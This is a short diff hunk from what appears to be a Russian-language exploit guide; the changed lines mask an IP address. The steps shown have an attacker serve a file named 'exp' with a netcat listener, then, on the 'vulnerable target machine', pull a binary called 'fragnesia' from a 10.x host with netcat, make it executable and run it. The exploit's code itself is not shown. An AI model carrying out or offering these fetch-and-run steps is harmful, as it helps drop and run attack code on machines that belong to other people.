@@ -39,7 +39,7 @@ nc -l -p 1234 < exp
 
 ### 4. На целевой машине (уязвимой) выполнить
 ```
-nc IP_REMOVED 1234 > fragnesia
+nc 10.** 1234 > fragnesia
 chmod +x fragnesia
 ./fragnesia
 ```
